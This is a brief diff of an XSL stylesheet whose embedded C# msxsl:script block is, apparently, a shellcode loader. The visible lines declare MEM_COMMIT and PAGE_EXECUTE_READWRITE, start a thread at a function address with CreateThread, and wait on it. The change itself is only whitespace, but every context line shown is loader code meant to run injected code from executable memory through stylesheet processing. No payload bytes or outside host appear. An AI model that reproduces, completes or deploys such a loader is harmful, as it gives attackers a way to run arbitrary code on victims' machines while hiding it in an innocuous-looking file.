@@ -4,7 +4,7 @@
                 xmlns:my="urn:MyModule">
 
   <msxsl:script implements-prefix="my" language="C#">
-	<msxsl:using namespace="System.Runtime.InteropServices" />  
+  <msxsl:using namespace="System.Runtime.InteropServices" />  
 
      private static UInt32 MEM_COMMIT = 0x1000;          
      private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
@@ -49,7 +49,6 @@
            IntPtr pinfo = IntPtr.Zero;
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);            
-
     }
   </msxsl:script>
 
